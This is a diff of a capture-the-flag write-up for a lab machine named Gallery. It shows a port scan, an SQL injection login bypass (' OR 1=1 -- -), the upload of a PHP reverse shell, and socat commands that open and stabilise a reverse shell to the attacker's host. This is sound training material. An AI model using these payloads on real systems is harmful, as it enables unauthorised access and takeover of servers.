@@ -1,5 +1,5 @@
 
-# Gallery
+<center># Gallery</center>
 
 
 ## Description
@@ -14,7 +14,7 @@ We are provided with the IP of the machine.
 
 ### Port Scan
 
-Basic port scan shows that there are two open ports on the machine.
+&nbsp;&nbsp;Basic port scan shows that there are two open ports on the machine.
 
 ```
 Not shown: 998 closed tcp ports (conn-refused)
@@ -35,14 +35,17 @@ PORT     STATE SERVICE VERSION
 
 #### Port 80
 
-Going over to the port 80 shows default Apache webpage.
+&nbsp;&nbsp;&nbsp;Going over to the port 80 shows default Apache webpage.
 
 
 #### Port 8080
 
-Going over to the port 8080 redirects to /gallery/login.php
+&nbsp;&nbsp;&nbsp;Going over to the port 8080 redirects to /gallery/login.php
 
-Searching the title *Simple Image Gallery System* on google shows that it is an open source image manager that works on **php** and **SQL**.
+<img src="./images/login%20form.png" width="500">
+
+&nbsp;&nbsp;&nbsp;Searching the title *Simple Image Gallery System* on google shows that it is an open source image manager that works on **php** 
+&nbsp;&nbsp;&nbsp;and **SQL**.
 
 
 ### Login
@@ -50,6 +53,7 @@ Searching the title *Simple Image Gallery System* on google shows that it is an 
 Since the webpage is running SQL, we can use the creds to login.
 
 >**Username**: ' OR 1=1 -- -
+
 >**Password**: ' OR 1=1 -- -
 
 This gives us the access as *Admin*
@@ -57,7 +61,33 @@ This gives us the access as *Admin*
 
 ## Getting Shell
 
-Then we can upload a reverse shell in the **Album** and include it to get the shell.
+To get a shell we can upload a reverse shell in the **Album** and include it.
 
 Here I have used the PHP reverse shell from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
+After getting shell in order to stabilize it we can use Python.
+But I have used socat since it is already installed on the machine.
+
+attacker
+```
+socat file:`tty`,raw,echo=0 tcp-listen:<port>
+```
+victim
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:<port>
+```
+
+## Machine
+
+We get the shell as the user www-data.
+
+Checking the /etc/passwd shows that we have these users
+```
+1. mike
+2. ubuntu
+3. root
+```
+
+To enumerate the machine I have used [linpeas](https://linpeas.sh)
+Here there is an interesting result
+![linpeas result](/Gallery/images/linpeas.png "linpeas result")
